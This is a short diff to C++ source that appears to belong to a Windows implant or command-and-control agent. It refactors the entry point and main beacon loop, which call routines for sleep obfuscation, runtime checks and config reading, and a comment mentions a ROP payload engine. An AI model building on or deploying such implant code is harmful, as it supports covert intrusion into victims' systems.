@@ -1,13 +1,14 @@
 #include <core/corelib.hpp>
 // todo: the idea for "ROP-Engine" is just to make writing rop payloads/programming easier. (Desil)
 
+
+#define ASSERT_ERR(x) if (x && NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return
+
 VOID Entrypoint(HMODULE Base) {
 
-    Memory::ContextInit();
-    Memory::ResolveApi();
-    if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) {
-        return;
-    }
+    ASSERT_ERR(Memory::ContextInit());
+    ASSERT_ERR(Memory::ResolveApi());
+    ASSERT_ERR(Implant::ReadConfig());
 
     Implant::MainRoutine();
 }
@@ -21,7 +22,6 @@ namespace Implant {
     VOID MainRoutine() {
         HEXANE
 
-        Implant::ReadConfig();
         do {
             Opsec::SleepObf();
             Opsec::SeRuntimeCheck();
@@ -49,7 +49,7 @@ namespace Implant {
             } else {
                 Ctx->Session.Retry = 0;
             }
-        } while (TRUE);
+        } while (ntstatus != ERROR_EXIT);
 
     defer:
         Memory::ContextDelete(Ctx);
